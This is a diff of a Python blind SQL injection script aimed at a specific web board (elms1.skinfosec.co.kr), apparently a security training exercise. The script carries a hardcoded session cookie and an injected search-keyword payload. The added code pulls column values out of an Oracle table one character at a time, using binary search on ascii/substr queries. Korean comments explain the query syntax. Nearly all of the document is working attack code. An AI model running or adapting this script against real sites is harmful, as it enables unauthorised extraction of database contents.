@@ -27,7 +27,7 @@ import requests
 
 url = 'http://elms1.skinfosec.co.kr:8082/community6/free'
 param = {"searchType" : "all", "keyword" : "yahoo"}
-jsession = {'JSESSIONID':'64786673AA6C985F8D4A5AD4FF67EE0C'}
+jsession = {'JSESSIONID':'00B70B25BE74FAB4DE26E3F0ADA1CDE4'}
 contype = {'Content-Type':'application/x-www-form-urlencoded'}
 
 keyword = "yahoo%' and {} and '1%'='1"
@@ -120,17 +120,26 @@ def count_data(table_name, column_name):
 def extract_data(table_name, column_name, data_count):
     column_name_list = column_name
     data_count_list = data_count
-    # '(select length(answer) from answer)
-    query = '(select length(answer) from answer)'
-    length_data = binary_search(query, keyword)
-    print(length_data)
 
-    #for i in range(0, len(column_name_list)):
-    #    for j in range(0, data_count_list[i]):
-    #        query = f"(select length('{column_name_list[i]}') as data_length from (select '{column_name_list[i]}' from '{table_name}' where rownum = {j}))"
-    #        length_data = binary_search(query, keyword)
-    #        
-    #        print(f'{i+1}번째 컬럼에서 {j+1}번째 열의 데이터 길이 : {length_data}')
+    # 괄호나, from에는 '' 사용하지 않는다.
+    query = "(select length({}) from {} where rownum = {})"
+
+    for i in range(0, len(column_name_list)):
+        for j in range(0, data_count_list[i]):
+           query_modify = query.format(column_name_list[i], table_name, j+1)
+           length_data = binary_search(query_modify, keyword)
+           print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 길이 : {length_data}')
+
+           result_data_name = ''
+
+           for k in range(1, length_data+1):
+                data_query = "(select ascii(substr({}, {}, 1)) from {} where rownum = {})"
+                data_query_modify = data_query.format(column_name_list[i], k, table_name, j+1)
+                find_data_name = binary_search(data_query_modify, keyword)
+
+                result_data_name += chr(find_data_name)
+        print(f'{column_name_list[i]} 컬럼에서 {j+1}번째 데이터의 이름 : {result_data_name}')
+
     return
 
 ######### MAIN ###################
@@ -152,7 +161,9 @@ column = ['ANSWER', 'RED_DT', 'REG_ACCT_ID', 'UDT_DT', 'UDT_ACCT_ID']
 count = [1, 1, 1, 1, 1]
 # test5 = count_data(test2, column_name_list)
 test6 = extract_data(table, column, count)
-
+column_data_length_list = []
 # column_count = []
 # test4 = table_columns_name(test2, test3)
 # column_list = [ANSWER, RED_DT, REG_ACCT_ID, UDT_DT, UDT_ACCT_ID]
+
+data_length = [4, 1, 13, 9, 13]
